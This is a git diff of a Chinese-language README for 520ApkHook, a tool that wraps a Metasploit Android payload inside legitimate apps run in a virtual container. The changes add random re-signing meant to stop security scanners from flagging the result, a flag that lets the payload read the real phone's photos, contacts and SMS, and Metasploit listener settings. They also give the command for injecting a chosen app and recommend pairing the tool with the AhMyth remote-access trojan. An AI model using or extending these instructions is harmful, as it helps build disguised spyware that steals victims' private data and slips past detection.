@@ -16,15 +16,24 @@
 
 ## 版本升级
 
+* 2024-05-21
+  * 修复了520apkhook的相关问题（app中文名报错、apk签名被标记。）
+
+  * 新增了随机签名的功能，先获取原始app的相关签名信息，根据这些信息重新生成新的签名，签名密码每次都不一样，避免被标记。(有些app会无法识别签名信息，可以自己用jadx获取到app的签名信息，然后生成证书，使用[ApkSigner](https://github.com/jixiaoyong/ApkSigner)进行重新签名。华为目前还有问题，改签名也会被识别恶意app)
+
+  * 更换了两个安卓虚拟机，[NewBlackbox](https://github.com/ALEX5402/NewBlackbox)、[SpaceCore](https://github.com/FSpaceCore/SpaceCore)。安卓版本支持到`5-14`。
+
+  * 新增了`-b, --boxName`参数，用来指定`SpaceCore`还是`NewBlackBox`，默认SpaceCore，如果出现卡顿或者闪退，可以尝试切换到NewBlackBox。直接指定参数 `-b NewBlackBox` 即可。
+
 * 2023-06-05
+  * 上版本忘记添加32位app支持，此次升级加入32位app支持。更换了虚拟机项目依赖，稳定性更好一下。
 
-* 上版本忘记添加32位app支持，此次升级加入32位app支持。更换了虚拟机项目依赖，稳定性更好一下。
+  * 支持安卓5-12版本，不支持最新的安卓13。
 
-* 支持安卓5-12版本，不支持最新的安卓13。
+  * 问题1、目前有问题的app，微信、ES文件浏览器。
 
-* 问题1、目前有问题的app，微信、ES文件浏览器。
+  * 问题2、被注入的app读取到的文件、图片、通讯录、短信是虚拟机的内容，但是注入的payload获取到的是实体机的内容。
 
-* 问题2、被注入的app读取到的文件、图片、通讯录、短信是虚拟机的内容，但是注入的payload获取到的是实体机的内容。
 
 ## 优点
 
@@ -39,7 +48,7 @@
 
 1. 下载Releases中打包好的jar包  
 
- * [a520ApkHook-1.0-jar-with-dependencies.jar](https://github.com/ba0gu0/520apkhook/releases/download/v2.0/a520ApkHook-1.0-jar-with-dependencies.jar)
+ * [a520ApkHook-1.2-jar-with-dependencies.jar](https://github.com/ba0gu0/520apkhook/releases/download/v2.0/a520ApkHook-1.2-jar-with-dependencies.jar)
 
 2. msfmsfvenom
 
@@ -59,13 +68,16 @@ set lhost 0.0.0.0
 set lport 3306
 set exitonsession false
 exploit -j
-
 ```
 4. 520ApkHook
 
+> msf由于加载机制问题，需要`-o`参数，才可以获取照片、通讯录、短信等。
+>
+> 如果在运行app时，提示版本太老、一堆权限提示，可以把`-o`去掉，但是权限会出问题。
+
 ```shell
 
-java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk
+java -jar a520ApkHook-1.0-jar-with-dependencies.jar -o ~/Downloads/想进行注入的App.apk ~/Downloads/msf.apk
 
 ```
 
@@ -73,34 +85,24 @@ java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Do
 
 ### 搭配其他远控使用
 
-* 一款安卓僵尸网络远控工具, 服务端是web网页,  基于[https://deta.space](https://deta.space) 搭建(匿名): 
+* 推荐搭配`AhMyth`，配在一起贼爽。
 
-  * [https://github.com/ScRiPt1337/Teardroid-phprat](https://github.com/ScRiPt1337/Teardroid-phprat)
-
-* 一款安卓远控程序, 服务端是GUI程序: 
-
-  * [https://github.com/AhMyth/AhMyth-Android-RAT](https://github.com/AhMyth/AhMyth-Android-RAT)
-
-* 搜集的一些github上的安卓远控项目:
-
-  *  [https://github.com/wishihab/Android-RATList](https://github.com/wishihab/Android-RATList)
+> 使用AhMyth时，不需要添加`-o`参数，不然app会提示版本太老，一堆权限提示太假。
+>
+> [https://github.com/Morsmalleo/AhMyth](https://github.com/Morsmalleo/AhMyth)
 
 
 ## BUG
 
-* 微信、ES文件浏览器只能通过应用克隆的方式安装，需要先指定微信的apk包，生成520ApkHook.apk. 再使用np管理器把assets目录下的和对应apk大小一样的文件给删除掉。再使用np管理器重新进行签名即可.（这种方法要求目标机器上要已经安装微信.）
-
-* 新生成的apk的包名字, 不能和被注入的apk包名字一样, 程序默认已经修改.
-
-* msf无法在鸿蒙OS使用, 文件读取在鸿蒙OS上也无法正常使用.
-
+* 使用SpaceCore作为基础容器，能运行90%的app，但可能会出现app不流畅。
+* 使用NewBlackBox作为基础容器，目前测试不能在模拟器中运行，微信无法启动。
 * 其他未测试...
 
 ## 项目依赖
 
 * 本项目参考以下项目
-
-* 由于安卓虚拟化牵扯到其他github上被下架的程序，在这里不再进行列出，避免被影响。
+* [https://github.com/ALEX5402/NewBlackbox](https://github.com/ALEX5402/NewBlackbox)
+* [https://github.com/FSpaceCore/SpaceCore](https://github.com/FSpaceCore/SpaceCore)
 
 
 ## 重点说明
